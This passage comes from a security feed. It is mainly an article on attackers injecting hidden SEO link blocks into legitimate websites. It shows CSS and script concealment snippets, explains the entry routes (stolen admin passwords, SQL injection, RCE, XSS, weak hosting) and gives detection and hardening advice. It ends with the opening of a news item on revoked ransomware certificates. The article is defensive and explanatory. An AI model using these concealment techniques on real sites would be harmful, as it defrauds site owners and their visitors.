			 because the element is technically present in the rendering, although it is not visible to the user. Nevertheless, it is worth noting that modern search engine security algorithms, such as Google Penguin, detect this technique too. To counter this, malicious actors may employ more complex techniques for evading detection. Here is another example:<script src="files/layout/js/slider3d.js?v=0d6651e2"></script><script src="files/layout/js/layout.js?v=51a52ad1"></script>

Aside from the parameters we are already familiar with, which are responsible for concealing a block (
			), and the name that hints at its contents (
			), strings with scripts in this example can be found at the very beginning: 
			 and 
			. These indicate that external JavaScript can dynamically control the page content, for example, by adding or changing hidden links, that is, modifying this block in real time.This is a more advanced approach than the ones in the previous examples. Yet it is also detected by filters responsible for identifying suspicious manipulations.Other parameters and attributes exist that attackers use to conceal a link block. These, however, can also be detected:the parameter 
			 can sometimes be seen instead of 
			.Within 
			, the block with hidden links may not have a zero size, but rather be located far beyond the visible area of the page. This can be set, for example, via the property 
			, as in the example below.<div style="position: absolute; left: -9232px">

This may be a weak or compromised password for an administrator account, plugins or an engine that have not been updated in a long time, poor filtering of user inputs, or security issues on the hosting provider’s side. Furthermore, attackers may attempt to exploit the human factor, for example, by setting up targeted or mass phishing attacks in the hope of obtaining the website administrator’s credentials.Let us examine in detail the various mechanisms through which an attacker gains access to editing a page’s HTML code.Compromise of the administrator password. An attacker may guess the password, use phishing to trick the victim into giving it away, or steal it with the help of malware. Furthermore, the password may be found in a database of leaked credentials. Site administrators frequently use simple passwords for control panel protection or, even worse, leave the default password, thereby simplifying the task for the attacker.
After gaining access to the admin panel, the attacker can directly edit the page’s HTML code or install their own plugins with hidden SEO blocks.Exploitation of CMS (WordPress, Joomla, Drupal) vulnerabilities. If the engine or plugins are out of date, attackers use known vulnerabilities (SQL Injection, RCE, or XSS) to gain access to the site’s code. After that, depending on the level of access gained by exploiting the vulnerability, they can modify template files (header.php, footer.php, index.php, etc.), insert invisible blocks into arbitrary site pages, and so on.
In SQL injection attacks, the hacker injects their malicious SQL code into a database query. Many websites, from news portals to online stores, store their content (text, product descriptions, and news) in a database. If an SQL query, such as 
			 allows passing arbitrary data, the attacker can use the 
			 field to inject their code. This allows the attacker to change the content of records, for example, by inserting HTML with hidden blocks.
In RCE (remote code execution) attacks, the attacker gains the ability to run their own commands on the server where the website runs. Unlike SQL injections, which are limited to the database, RCE provides almost complete control over the system. For example, it allows the attacker to create or modify site files, upload malicious scripts, and, of course, inject invisible blocks.
In an XSS (cross-site scripting) attack, the attacker injects their JavaScript code directly into the web page by using vulnerable input fields, such as those for comments or search queries. When another user visits this page, the malicious script automatically executes in their browser. Such a script enables the attacker to perform various malicious actions, including stealthily adding a hidden 
			 block with invisible links to the page. For XSS, the attacker does not need direct access to the server or database, as in the case with SQL injection or RCE; they only need to find a single vulnerability on the website.An attack via the hosting provider. In addition to directly hacking the target website, an attacker may attempt to gain access to the website through the hosting environment. If the hosting provider’s server is poorly secured, there is a risk of it being compromised. Furthermore, if multiple websites or web applications run on the same server, a vulnerability in one of them can jeopardize all other projects. The attacker’s capabilities depend on the level of access to the server. These capabilities may include: injecting hidden blocks into page templates, substituting files, modifying databases, connecting external scripts to multiple websites simultaneously, and so forth. Meanwhile, the website administrator may not notice the problem because the vulnerability is being exploited within the server environment rather than the website code.Note that hidden links appearing on a website is not always a sign of a cyberattack. The issue often arises during the development phase, for example, if an illegal copy of a template is downloaded to save money or if the project is executed by an unscrupulous web developer.One of the most obvious goals for injecting hidden blocks into other people’s websites is to steal the PageRank from the victim. The more popular and authoritative the website is, the more interesting it is to attackers. However, this does not mean that moderate- or low-traffic websites are safe. As a rule, administrators of popular websites and large platforms do their best to adhere to security rules, so it is not so easy to get close to them. Therefore, attackers may target less popular – and less protected – websites.As previously mentioned, this approach to promoting websites is easily detected and blocked by search engines. In the short term, though, attackers still benefit from this: they manage to drive traffic to the websites that interest them until search engine algorithms detect the violation.Even though the user does not see the hidden block and cannot click the links, attackers can use scripts to boost traffic to their websites. One possible scenario involves JavaScript creating an iframe in the background or sending an HTTP request to the website from the hidden block, which then receives information about the visit.Hidden links can lead not just to pornographic or other questionable websites but also to websites with low-quality content whose sole purpose is to be promoted and subsequently sold, or to phishing and malicious websites. In more sophisticated schemes, the script that provides “visits” to such websites may load malicious code into the victim’s browser.Finally, hidden links allow attackers to lower the reputation of the targeted website and harm its standing with search engines. This threat is especially relevant in light of the fact that algorithms such as Google Penguin penalize websites hosting questionable links. Attackers may use these techniques as a tool for unfair competition, hacktivism, or any other activity that involves discrediting certain organizations or individuals.Interestingly, in 2025, we have more frequently encountered hidden blocks with links to pornographic websites and online casinos on various legitimate websites. With low confidence, we can suggest that this is partly due to the development of neural networks, which make it easy to automate such attacks, and partly due to the regular updates to Google’s anti-spam systems, the latest of which was completed at the end of September 2025: attackers may have rushed to maximize their gains before the search engine made it a little harder for them.Consequences for the victim websiteThe consequences for the victim website can vary in severity. At a minimum, the presence of hidden links placed by unauthorized parties hurts search engine reputation, which may lead to lower search rankings or even complete exclusion from search results. However, even without any penalties, the links disrupt the internal linking structure because they lead to external websites and pass on a portion of the victim’s weight to them. This negatively impacts the rankings of key pages.Although unseen by visitors, hidden links can be discovered by external auditors, content analysis systems, or researchers who report such findings in public reports. This is something that can undermine trust in the website. For example, sites where our categorization engine detects links to pornography pages will be classified as “Adult content”. Consequently, all of our clients who use web filters to block this category will be unable to visit the website. Furthermore, information about a website’s category is published on our Kaspersky Threat Intelligence Portal and available to anyone wishing to look up its reputation.If the website is being used to distribute illegal or fraudulent content, the issue enters the legal realm, with the owner potentially facing lawsuits from copyright holders or regulators. For example, if the links lead to websites that distribute pirated content, the site may be considered an intermediary in copyright infringement. If the hidden block contains malicious scripts or automatic redirects to questionable websites, such as phishing pages, the owner can be charged with fraud or some other cybercrime.The simplest and most accessible method for any user to check a website for a hidden block is to view its source code in the browser. This is very easy to do. Navigate to the website, press Control+U, and the website’s code will open in the next tab. Search (Control+F) the code for the following keywords: 
			. In addition, you can check for keywords that are characteristic of the hidden content itself. When it comes to links that point to adult or gambling sites, you should look for 
			, and the like.A slightly more complex method is using web developer tools to investigate the DOM for invisible blocks. After the page fully loads, open DevTools (F12) in the browser and go to the Elements tab. Search (Control+F) for keywords such as 
			. Hover your cursor over suspicious elements in the code so the browser highlights their location on the page. If the block occupies zero area or is located outside the visible area, that is an indicator of a hidden element. Check the Computed tab for the selected element; there, you can see the applied CSS styles and confirm that it is hidden from the user’s view.You can also utilize specialized SEO tools. These are typically third-party solutions that scan website SEO data and generate reports. They can provide a report about suspicious links as well. Few of them are free, but when selecting a tool, you should be guided primarily by the vendor’s reputation rather than price. It is better to use tried-and-true, well-known services that are known to be free of malicious or questionable payloads. Examples of these trusted services include Google Search Console, Bing Webmaster Tools, OpenLinkProfiler, and SEO Minion.Another way to discover hidden SEO spam on a website is to check the CMS itself and its files. First, you should scan the database tables for suspicious HTML tags with third-party links that may have been inserted by attackers, and also carefully examine the website’s template files (header.php, footer.php, and index.php) and included modules for unfamiliar or suspicious code. Pay particular attention to encrypted insertions, unclear scripts, or links that should not originally be present in the website’s structure.Additionally, you can look up your website’s reputation on the Kaspersky Threat Intelligence Portal. If you find it in an uncharacteristic category – typically “Adult content”, “Sexually explicit”, or “Gambling” – there is a high probability that there is a hidden SEO spam block embedded in your website.How to protect your websiteTo prevent hidden links from appearing on your website, avoid unlicensed templates, themes, and other pre-packaged solutions. The entire site infrastructure must be built only on licensed and official solutions. The same principle applies to webmasters and companies you hire to build your website: we recommend checking their work for hidden links, but also for vulnerabilities in general. Never cut corners when it comes to security.Keep your CMS, themes, and plugins up to date, as new versions often patch known vulnerabilities that attackers can exploit. Delete any unused plugins and themes, if any. The less unnecessary components are installed, the lower the risk of an exploit in one of the extensions, plugins, and themes. It is worth noting that this risk never disappears completely – it is still there even if you have a minimal set of components as long as they are outdated or poorly secured.To protect files and the server, it is important to properly configure access permissions. On servers running Linux and other Unix-like systems, use  for files and  for folders. This means that the owner can open folders, and read and modify folders and files, while the group and other users can only read files and open folders. If write access is not necessary, for example in template folders, forbid it altogether to lower the risk of malicious actors making unauthorized changes. Furthermore, you must set up regular, automatic website backups so that data can be quickly restored if there is an issue.Additionally, it is worth using web application firewalls (WAFs), which help block malicious requests and protect the site from external attacks. This solution is available in Kaspersky DDoS Protection.To protect the administrator panel, use only strong passwords and 2FA (Two-Factor Authentication) at all times. You would be well-advised to restrict access to the admin panel by IP address if you can. Only a limited group of individuals should be granted admin privileges.]]></content:encoded></item><item><title>Microsoft Revokes 200 Fraudulent Certificates Used in Rhysida Ransomware Campaign</title><link>https://thehackernews.com/2025/10/microsoft-revokes-200-fraudulent.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikW56LsCKHPpyfH2AIVdz2Cuy3x2z7pTgiAMRHiyYU0m-wnbxE-8zGrGaamjCX79Ypc9Hz6-JHph78BvlB56sNwYh20cI5LcVuNLrx8C9izVE7Z3o_d6KgHWpoMNENBjinWUUco_7hzc9NwxFtmC__VF0Cfud9e3q61stbWCaHG_5jDh5QEtrcSf8WsJav/s1600/ransomware-certificate.jpg" length="" type=""/><pubDate>Fri, 17 Oct 2025 06:03:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Microsoft on Thursday disclosed that it revoked more than 200 certificates used by a threat actor it tracks as Vanilla Tempest to fraudulently sign malicious binaries in ransomware attacks.
